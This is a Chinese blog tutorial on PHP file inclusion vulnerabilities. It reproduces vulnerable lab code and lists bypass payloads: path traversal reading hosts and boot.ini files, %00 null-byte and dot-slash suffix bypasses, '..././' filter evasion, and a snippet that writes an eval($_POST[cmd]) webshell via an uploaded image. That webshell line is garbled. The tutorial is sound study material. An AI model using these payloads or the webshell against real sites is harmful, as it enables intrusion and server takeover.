{"blogid": "124575521", "writerAge": "码龄3年", "writerBlogNum": "19", "writerCollect": "554", "writerComment": "512", "writerFan": "855", "writerGrade": "4级", "writerIntegral": "1585", "writerName": "花城的包包", "writerProfileAdress": "writer_image\\profile_124575521.jpg", "writerRankTotal": "24946", "writerRankWeekly": "18752", "writerThumb": "451", "writerVisitNum": "42964", "blog_read_count": "2180", "blog_time": "已于 2022-06-08 00:17:27 修改", "blog_title": "文件包含漏洞", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-tomorrow-night\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<p></p>\n<div class=\"toc\">\n<h3>目录</h3>\n<ul><li><a href=\"#_1\">🌻一、理论</a></li><li><ul><li><a href=\"#1_2\">🍎1.什么是文件包含漏洞？</a></li><li><a href=\"#2_4\">🍎2.文件包含漏洞原因</a></li><li><a href=\"#3_7\">🍎3.文件包含函数</a></li><li><a href=\"#4_17\">🍎4.文件包含漏洞的分类</a></li><li><ul><li><a href=\"#_41LFI_18\">🥑 4.1本地文件包含（LFI）</a></li><li><a href=\"#42RFI_32\">🥑4.2远程文件包含（RFI）</a></li></ul>\n</li><li><a href=\"#5php_37\">🍎5.php伪协议</a></li><li><a href=\"#6_47\">🍎6.文件包含漏洞如何防御？</a></li></ul>\n</li><li><a href=\"#_56\">🌻二、绕过方式</a></li><li><ul><li><a href=\"#1_57\">🍎1、结合文件上传漏洞绕过</a></li><li><a href=\"#200_80\">🍎2、00截断绕过</a></li><li><a href=\"#3_99\">🍎3、点加斜杠绕过</a></li><li><a href=\"#4_128\">🍎4、去掉后缀名绕过</a></li><li><a href=\"#5_158\">🍎5、双写点点杠绕过</a></li><li><a href=\"#6methodPOST_186\">🍎6、method为POST</a></li><li><a href=\"#7_215\">🍎7、包含日志文件</a></li></ul>\n</li><li><a href=\"#_216\">🌻三、待补充</a></li></ul>\n</div>\n<p></p>\n<h1><a id=\"_1\"></a>🌻一、理论</h1>\n<h2><a id=\"1_2\"></a>🍎1.什么是文件包含漏洞？</h2>\n<p>通过<code>PHP函数引入文件</code>时，传入的文件名没有经过<code>合理的验证</code>，从而操作了<code>预想之外的文件</code>，就可能导致意外的<code>文件泄漏</code>甚至恶意<code>代码注入</code>。</p>\n<h2><a id=\"2_4\"></a>🍎2.文件包含漏洞原因</h2>\n<p>为了代码更灵活，通常会把被包含的文件设置为<code>变量 </code>，进行<code>动态调用</code> ，从而导致<code>客户端可以调用任意文件</code> ，造成<code>文件包含漏洞</code>。动态包含的文件<code>路径参数，客户端可控 </code>。<code>web应用对用户的输入没有进行过滤或者严格过滤就带入文件包含函数中执行</code></p>\n<h2><a id=\"3_7\"></a>🍎3.文件包含函数</h2>\n<table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>include()</td><td>找不到被包含的文件时只产生警告 ，脚本将继续执行</td></tr><tr><td>include_once()</td><td>此语句和 include() 语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含</td></tr><tr><td>require()</td><td>找不到被包含的文件时会产生致命错误，并停止脚本</td></tr><tr><td>require_once()</td><td>此语句和 require()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含</td></tr></tbody></table>\n<p>其它用于包含的函数：<code>highlightfile()、 showsource()、 readfile()、 filegetcontents()、 fopen()、file()</code></p>\n<h2><a id=\"4_17\"></a>🍎4.文件包含漏洞的分类</h2>\n<h3><a id=\"_41LFI_18\"></a>🥑 4.1本地文件包含（LFI）</h3>\n<p>指通过相对路径/绝对路径 的方式能打开并包含 本地文件的漏洞，大部分情况遇到的文件包含漏洞都是 LFI用户可以 动态控制变量。</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>  <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> \n <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>获取系统中的其他文件内容绝对路径 读取本地 host 文件<br/> <code>payload：?filename=C:\\Windows\\System32\\drivers\\etc\\hosts</code><br/> 相对路径 读取本地 host 文件<br/> <code>payload：?filename=..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts</code><br/> 包含图片马<br/> <code>payload：?filename=./test.jpg</code></p>\n<h3><a id=\"42RFI_32\"></a>🥑4.2远程文件包含（RFI）</h3>\n<p>指的是能够包含远程服务器上的文件并执行，可以通过 http(s)或者 ftp 等方式，远程加载文件<br/> 条件<br/> allow_url_include = On （默认为 OFF，需要在 php.ini 中手动打开）allow_url_fopen = On （是否允许打开远程文件）用户可以动态控制变量</p>\n<h2><a id=\"5php_37\"></a>🍎5.php伪协议</h2>\n<table><thead><tr><th>协议</th><th>php版本</th><th>allow_url_fopen</th><th>aloow_url_include</th><th>作用</th></tr></thead><tbody><tr><td>file://</td><td>&gt;=5.2</td><td>off/on</td><td>off/on</td><td>访问本地文件系统</td></tr><tr><td>php://input</td><td>&gt;=5.2</td><td>off/on</td><td>off/on</td><td>访问请求的原始数据的只读流</td></tr><tr><td>zlib://</td><td>&gt;=5.2</td><td>off/on</td><td>off/on</td><td>压缩流</td></tr><tr><td>data://</td><td>&gt;=5.2</td><td>on</td><td>on</td><td>数据（RFC2397）</td></tr><tr><td>php://filter</td><td>/</td><td>/</td><td>/</td><td>php://filter/read=convert.base64-encode/resource=flag.php:是php中独有的一种协议，是一种过滤器，可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在读取和写入之前对数据进行一些过滤</td></tr></tbody></table>\n<p>（待补充…）</p>\n<h2><a id=\"6_47\"></a>🍎6.文件包含漏洞如何防御？</h2>\n<ul><li>php中使用open_basedir配置限制访问在指定的区域过滤；</li><li>过滤特殊字符如<code>（点)/(正斜杠)\\(反斜杠)</code>;</li><li>禁止服务器远程文件包含;</li><li>尽量不要使用动态包含，可以在需要包含的页面固定写好.</li><li>配置php.ini配置文件</li><li>设置黑白名单</li></ul>\n<h1><a id=\"_56\"></a>🌻二、绕过方式</h1>\n<h2><a id=\"1_57\"></a>🍎1、结合文件上传漏洞绕过</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>     <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"../common/header.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span> from https<span class=\"token punctuation\">:</span><span class=\"token comment\">//pentesterlab.com/exercises/php_include_and_post_exploitation/course --&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php <span class=\"token function\">hint</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"will include the arg specified in the GET parameter \\\"page\\\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span>form action<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"/LFI-1/index.php\"</span> method<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"GET\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"text\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"page\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"page\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>这种情况直接包含一个存在的文件就会被当做php文件执行<br/> 利用绝对路径去读c盘下的敏感信息：<br/> <code>?page=c://boot.ini</code><br/> 结合文件上传漏洞打一套组合拳<br/> 思路：例如，你进入了某网站的后台，在修改头像处可上传文件，但是图片上传限制了后缀名jpg/png，那你就可以上传一张jpg或者png的图片马，即在图片中写入php木马，然后上传，留意一下上传的图片位置，如果该站还存在文件包含漏洞，那么你就可以通过文件包含刚刚你上传的图片马获取websehll。<br/> <code>?page=../../../../webshell.jpg</code><br/> 和包含的文件类型没有关系，都会被当做php解析。</p>\n<h2><a id=\"200_80\"></a>🍎2、00截断绕过</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>     <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"../common/header.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span> from http<span class=\"token punctuation\">:</span><span class=\"token comment\">//www.ush.it/2009/02/08/php-filesystem-attack-vectors/ --&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php <span class=\"token function\">hint</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"will include the arg specified in the GET parameter \\\"library\\\", appends .php to end, escape with NULL byte %00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span>form action<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"/LFI-2/index.php\"</span> method<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"GET\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"text\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"library\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"includes/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'library'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>这种情况，如果你包含一个<code>?library=../../../../webshell.php</code>后台得到的是<code>?library=../../../../webshell.php.php</code>,显然这样并不能被解析。<br/> 这个时候我们就可以用%00截断<code>?library=../../../../webshell.php%00</code>后台得到的是这样的<code>?library=../../../../webshell.php .php</code>后面那个.php就会被忽略掉了。</p>\n<h2><a id=\"3_99\"></a>🍎3、点加斜杠绕过</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>     <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"../common/header.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span> from http<span class=\"token punctuation\">:</span><span class=\"token comment\">//www.ush.it/2009/02/08/php-filesystem-attack-vectors/ --&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php <span class=\"token function\">hint</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"will include the arg specified in the GET parameter \\\"file\\\", looks for .php at end - bypass by apending /. (slash plus dot)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n\n<span class=\"token operator\">&lt;</span>form action<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"/LFI-3/index.php\"</span> method<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"GET\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"text\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">&gt;</span>\n\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token string single-quoted-string\">'.php'</span><span class=\"token punctuation\">)</span>\n <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">else</span>\n <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'You are not allowed to see source files!'</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>读源码，我们可以发现，它多了一个判断，即<code>if (substr($_GET['file'], -4, 4) != '.php')</code>这句代码的意思是，取文件的后四位，如果不是<code>.php</code>结尾的就去读取内容，否则输出<code>You are not allowed to see source files!</code><br/> 绕过思路：我们可以在文件名后面加一个点、斜杠或者%00绕过<br/> <code>?file=../../../../webshell.php.</code><br/> <code>?file=../../../../webshell.php/.</code><br/> <code>?file=../../../../webshell.php%00</code><br/> 注意：浏览器可能会过滤掉，我们可以用<code>BP</code>抓包修改。<br/> windows文件名不允许包含这些特殊字符，如果你创建一个<code>test.php.</code>得到的是一个<code>test.php</code>后面哪个点会自动抹掉。<br/> <img alt=\"在这里插入图片描述\" src=\"image\\180352396c0a4098b4c07a40495cc056.png\"/></p>\n<h2><a id=\"4_128\"></a>🍎4、去掉后缀名绕过</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>     <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"../common/header.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span> from http<span class=\"token punctuation\">:</span><span class=\"token comment\">//www.ush.it/2009/02/08/php-filesystem-attack-vectors/ --&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php <span class=\"token function\">hint</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"will include the arg specified in the GET parameter \\\"class\\\", appends .php to end, defeat with NULL byte %00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n\n<span class=\"token operator\">&lt;</span>form action<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"/LFI-4/index.php\"</span> method<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"GET\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"text\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"class\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'includes/class_'</span><span class=\"token operator\">.</span><span class=\"token function\">addslashes</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'class'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>这里关键在于<code>addslashes</code>这个函数<br/> 定义和用法<br/> addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。<br/> 预定义字符是：</p>\n<pre><code>单引号（'）\n双引号（\"）\n反斜杠（\\）\nNULL\n</code></pre>\n<p>意思就是将这些危险字符前面加反斜杠<code>\\</code>转义掉，是一种预防攻击的方法。<br/> 文件包含的时候去掉后缀<code>.php</code>即可<br/> <code> ?class=../../../../phpinfo</code></p>\n<h2><a id=\"5_158\"></a>🍎5、双写点点杠绕过</h2>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span> from http<span class=\"token punctuation\">:</span><span class=\"token comment\">//hakipedia.com/index.php/Local_File_Inclusion --&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php     <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"../common/header.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php <span class=\"token function\">hint</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"will include the arg specified in the GET parameter \\\"file\\\", strips prepended \\\"../\\\" strings, must encode / with %2f\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n\n<span class=\"token operator\">&lt;</span>form action<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"/LFI-5/index.php\"</span> method<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"GET\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"text\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token class-name type-declaration\">php</span>\n   <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'../'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n   <span class=\"token punctuation\">{<!-- --></span>\n       <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"pages/<span class=\"token interpolation\"><span class=\"token variable\">$file</span></span>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n   <span class=\"token keyword\">else</span>\n   <span class=\"token punctuation\">{<!-- --></span>\n       <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>通过源码可以看到，他把<code>../</code>替换成了空，这一句：<code>$file = str_replace('../', '', $_GET['file']);</code><br/> 绕过思路：在两个点之间加<code>../</code><br/> <code>?file=..././..././..././..././phpinfo.php</code></p>\n<h2><a id=\"6methodPOST_186\"></a>🍎6、method为POST</h2> &lt;?php include(\"../common/header.php\"); ?&gt; \n<pre><code class=\"prism language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span> from https<span class=\"token punctuation\">:</span><span class=\"token comment\">//pentesterlab.com/exercises/php_include_and_post_exploitation/course --&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php <span class=\"token function\">hint</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"will include the arg specified in the POST parameter \\\"page\\\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n\n<span class=\"token operator\">&lt;</span>form action<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"/LFI-6/index.php\"</span> method<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"POST\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"text\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"page\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"page\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>只不过是提交方式方便，绕过思路同GET。<br/> 绕过思路：上传点如果上传一张图片，</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\b08bb6a5b8594e81a66426e99370d64f.png\"/><br/> 内容为如下，当我们文件包含<code>tupian.jpg</code>的时候，会在同一目录下（这里的目录是当前根目录）生成一个<code>shell.php</code>的文件，内容为一句话木马<code>&lt;?php eval($_POST[cmd])?&gt;</code></p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">fputs</span><span class=\"token punctuation\">(</span><span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'shell.php'</span> <span class=\"token string single-quoted-string\">'w'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span>cmd<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>文件包含：<br/> <code>？page=../../../../tupian.jpg</code><br/> 然后菜刀连接。</p>\n<h2><a id=\"7_215\"></a>🍎7、包含日志文件</h2>\n<h1><a id=\"_216\"></a>🌻三、待补充</h1>\n<p>你有什么补充说明的，欢迎评论区留言讨论！</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}